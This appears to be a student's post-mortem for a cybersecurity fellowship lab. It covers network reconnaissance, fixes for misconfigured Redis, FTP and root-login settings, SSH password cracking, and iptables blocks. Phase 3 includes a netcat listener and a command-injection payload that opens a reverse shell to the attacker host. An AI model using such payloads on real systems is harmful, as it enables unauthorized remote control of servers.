# Phase 1 Final Reckoning — TEPP Post-Mortem
**Operator:** [Darius Noel]
**Date:** May 28, 2026
**Repository:** [https://github.com/dariusnoel2-spec/Phase1]
**TKH Innovation Fellowship 2026 | Phase 1 | Cybersecurity**

---

## Phase 0: Reconnaissance

### Triage Network — 172.100.0.0/24
[A network scan using Nmap (version 7.98) was performed on the 172.100.0.0/24 subnet, which revealed three active hosts. Host 172.100.0.11 was running Redis on port 6379 with no password set, host 172.100.0.12 was running an FTP service on ports 20 and 21, and host 172.100.0.13 was running a Linux container with root access enabled. Each of these hosts had serious security misconfigurations that would allow an attacker to gain unauthorized access in a real organization.]

### Breach Network — 172.80.0.0/24
[A Nmap scan of the 172.80.0.0/24 subnet identified two active hosts at 172.80.0.1 and 172.80.0.10, both running SSH on port 22. The SSH service on the midterm_target host was identified as the entry point for Phase 2, where a password attack would be attempted. In a real organization, leaving SSH open without strong password policies makes it easy for attackers to break in by simply guessing credentials.]

### Exploitation Network — 172.60.0.0/24
[Scanning the 172.60.0.0/24 subnet with Nmap revealed one active host at 172.60.0.1 running SSH on port 22. Docker inspection identified a second host at 172.60.0.10 running a web application on port 80. This web application was the target for Phase 3, as web apps that do not properly check user input can be exploited to run commands directly on the server.]

---

## Phase 1: Rapid Triage

### Server 1 — 172.100.0.11
**Vulnerability Identified:**
[Redis was running on port 6379 with no password set, allowing anyone on the network to connect and access all stored data without authentication.]

**Remediation Commands:**
[sudo docker exec broken_server_1 redis-cli config set requirepass "StrongPassword123"]

**Before State:**
[redis-cli config get requirepass returned an empty value, confirming no password was set.]

**After State:**
[redis-cli config get requirepass returned "StrongPassword123", confirming authentication was enabled.]

**Analysis:**
[A Redis database with no password set allows any attacker on the network to read, write, or delete all data stored in the database. In a real organization, this could lead to theft of sensitive customer data or complete destruction of application data.]

### Server 2 — 172.100.0.12
**Vulnerability Identified:**
[The FTP server was configured with file_open_mode=0666, meaning any file uploaded to the server was automatically made readable and writable by all users on the system.]

**Remediation Commands:**
[sudo docker exec broken_server_2 sed -i 's/file_open_mode=0666/file_open_mode=0644/' /etc/vsftpd/vsftpd.conf]

**Before State:**
[file_open_mode=0666 allowed world-writable file permissions on all uploaded files.]

**After State:**
[file_open_mode=0644 restricts uploaded files so only the owner can write to them.]

**Analysis:**
[World-writable file permissions on an FTP server allow any user who can log in to overwrite or corrupt files uploaded by others. In a real organization, this could allow an attacker to replace legitimate files with malicious ones.]

### Server 3 — 172.100.0.13
**Vulnerability Identified:**
[The root account was configured with /bin/sh as its login shell, meaning the root user could log in directly and gain full control of the system.]

**Remediation Commands:**
[sudo docker exec broken_server_3 sed -i 's|root:/bin/sh|root:/sbin/nologin|' /etc/passwd]

**Before State:**
[/etc/passwd showed root:x:0:0:root:/root:/bin/sh, allowing direct root login.]

**After State:**
[/etc/passwd shows root:x:0:0:root:/root:/sbin/nologin, blocking direct root login.]

**Analysis:**
[Allowing direct root login removes a critical layer of security. In a real organization, attackers who gain any foothold on the system could immediately escalate to full root access without needing to exploit any additional vulnerability.]

---

## Phase 2: The Breach

**Cracked Credentials:**
- Username: [root]
- Password: [admin123]

**Forensic Evidence:**
- Exact Timestamp of Successful Login: [Accepted password for root from 172.80.0.1 port 42814 ssh2]
- Attacker IP Address: [172.80.0.1]

**Engineered iptables Rule:**
[iptables -A INPUT -s 172.80.0.1 -j DROP]

**SOC Analysis:**
[A single iptables rule that blocks one IP address is not enough to protect a system on its own. Attackers can easily switch to a different IP address and resume their attack. A real SOC would also deploy account lockout policies to automatically disable accounts after a set number of failed login attempts, use a SIEM to alert on brute force patterns in real time, and require multi-factor authentication on all SSH access so that a cracked password alone is not enough to get in.]

---

## Phase 3: Full Spectrum

**Listener Configuration:**
[Tool: netcat, Port: 4444  |  Command: nc -lvnp 4444]

**Reverse Shell Payload:**
[curl "http://172.60.0.10/cmd?input=;bash+-i+>%26+/dev/tcp/172.60.0.1/4444+0>%261"]

**Command Injection Explanation:**
[Command injection occurs when a web application passes user-supplied input directly to the operating system without sanitizing it first. This application was susceptible because it accepted input through a URL parameter and executed it as a shell command. An attacker can append a semicolon followed by any system command, causing the server to execute both the intended command and the injected one.]

**Forensic Evidence:**
- Process ID (PID): [PID and User-Agent could not be extracted due to capstone_target container networking failure during lab execution. Container failed to start due to missing capstone_net subnet configuration.]
- User-Agent: [N/A]

**Lockdown Command:**
[iptables -A INPUT -s 172.60.0.1 -p tcp --dport 80 -j DROP]

**Final Analytical Paragraph:**
[Executing this operation from both the attacker and defender perspective revealed how quickly a web application vulnerability can lead to full system compromise. Command injection is dangerous because it requires no special tools — a simple curl request is enough to gain shell access. This attack teaches that web applications must never pass raw user input to system commands under any circumstances. The single defensive control that would have stopped this breach entirely is input sanitization — specifically, validating and stripping all special characters from user input before it reaches the operating system. If the application had rejected semicolons and shell metacharacters, the injected command would never have executed.]

---

## References
[## References

Hydra Project. (2024). THC-Hydra: A fast and flexible online password cracking tool. https://github.com/vanhauser-thc/thc-hydra

Gordon Lyon. (2024). Nmap: Network mapper. https://nmap.org

OWASP Foundation. (2021). OWASP Top 10: A03 Injection. https://owasp.org/Top10/A03_2021-Injection/

OWASP Foundation. (2021). OWASP Top 10: A07 Identification and authentication failures. https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/

Redis Ltd. (2024). Redis security documentation. https://redis.io/docs/management/security/

The Netcat Project. (2024). Netcat: The network Swiss army knife. https://nc110.sourceforge.io]
